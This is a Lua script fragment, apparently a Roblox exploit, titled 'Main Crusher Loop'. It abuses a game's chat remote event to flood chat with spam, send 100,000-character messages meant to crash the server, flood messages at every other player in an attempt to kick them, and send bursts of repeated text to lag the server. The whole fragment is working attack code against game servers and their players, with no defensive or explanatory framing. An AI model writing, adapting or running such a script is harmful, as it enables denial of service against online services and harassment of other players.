--// Main Crusher Loop
task.spawn(function()
    while task.wait() do
        if S.Enabled and SendChat then
            pcall(function()
                if S.UseSpam then
                    -- Spam mode
                    for i = 1, S.ChatSpamCount do
                        if not S.Enabled then break end

                        pcall(function()
                            if SendChat:IsA("RemoteEvent") then
                                -- Try different argument patterns
                                pcall(function() SendChat:FireServer(S.Message) end)
                                pcall(function() SendChat:FireServer(S.Message, "All") end)
                                pcall(function() SendChat:FireServer(S.Message, "All", false) end)
                                pcall(function() SendChat:FireServer("All", S.Message) end)
                            elseif SendChat:IsA("RemoteFunction") then
                                pcall(function() SendChat:InvokeServer(S.Message) end)
                                pcall(function() SendChat:InvokeServer(S.Message, "All") end)
                            end
                        end)

                        task.wait(S.Delay)
                    end
                end

                if S.UseCrash then
                    -- Crash mode - send huge messages
                    pcall(function()
                        local huge = string.rep("A", 100000)
                        if SendChat:IsA("RemoteEvent") then
                            SendChat:FireServer(huge)
                        else
                            SendChat:InvokeServer(huge)
                        end
                    end)
                end

                if S.UseKick then
                    -- Kick all players (if possible)
                    pcall(function()
                        for _, p in pairs(Players:GetPlayers()) do
                            if p ~= Player then
                                pcall(function()
                                    if SendChat:IsA("RemoteEvent") then
                                        SendChat:FireServer("/e "..string.rep("lol", 500), p.Name)
                                    end
                                end)
                            end
                        end
                    end)
                end

                if S.UseLag then
                    -- Lag server with spam
                    pcall(function()
                        for i = 1, 50 do
                            if SendChat:IsA("RemoteEvent") then
                                SendChat:FireServer(string.rep(S.Message, 100))
                            end
                        end
                    end)
                end
            end)
        end
    end
end)

